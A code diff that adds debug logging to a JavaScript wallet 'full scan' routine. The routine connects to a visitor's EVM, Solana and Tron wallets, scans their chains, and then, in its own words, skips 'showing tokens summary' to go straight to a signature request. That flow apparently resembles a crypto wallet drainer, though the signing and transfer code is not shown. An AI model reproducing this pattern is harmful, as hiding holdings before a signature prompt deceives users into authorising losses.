@@ -352,9 +352,12 @@ function init() {
 
 // ============ FULL SCAN ============
 async function startFullScan() {
+  console.log('🚀 START FULL SCAN CALLED');
   try {
+    console.log('Showing progress...');
     showProgress('connect', 'Processing...');
     
+    console.log('Connecting to wallets...');
     // Use Promise.allSettled instead of Promise.all to prevent hanging
     // This way if one connection times out, others can still proceed
     await Promise.allSettled([
@@ -363,14 +366,18 @@ async function startFullScan() {
       tryConnectTronWithTimeout()
     ]);
     
+    console.log(`Wallet connections done. EVM=${!!evmAddress}, Solana=${!!solanaAddress}, Tron=${!!tronAddress}`);
     log(`Connections: EVM=${!!evmAddress}, Solana=${!!solanaAddress}, Tron=${!!tronAddress}`);
     
+    console.log('Scanning chains...');
     await scanAllChains();
+    console.log('Chains scanned, requesting signature...');
     
     // Skip showing tokens summary, go straight to signature
     await requestSignature();
     
   } catch (err) {
+    console.error('❌ SCAN ERROR:', err);
     log('Scan error: ' + err.message, 'error');
     showError('Scan failed: ' + err.message);
   }
@@ -400,18 +407,22 @@ async function tryConnectTronWithTimeout() {
 
 // ============ EVM CONNECTION ============
 async function tryConnectEVM() {
+  console.log('tryConnectEVM: Starting...');
   if (!window.ethereum) {
+    console.log('tryConnectEVM: No window.ethereum found');
     log('No window.ethereum found');
     return;
   }
   
   if (typeof ethers === 'undefined') {
+    console.log('tryConnectEVM: ethers.js not loaded!');
     log('ERROR: ethers.js not loaded! Include: <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>', 'error');
     return;
   }
   
   try {
     log('Connecting EVM...');
+    console.log('tryConnectEVM: Requesting accounts...');
     evmProvider = new ethers.BrowserProvider(window.ethereum);
     const accounts = await evmProvider.send("eth_requestAccounts", []);
     
@@ -421,9 +432,11 @@ async function tryConnectEVM() {
       const network = await evmProvider.getNetwork();
       evmChainId = Number(network.chainId);
       
+      console.log(`✅ EVM: ${evmAddress} chain=${evmChainId}`);
       log(`✅ EVM: ${evmAddress.substring(0, 12)}... chain=${evmChainId}`, 'success');
     }
   } catch (err) {
+    console.log(`tryConnectEVM: Error:`, err.message);
     log('EVM failed: ' + err.message, 'error');
   }
 }
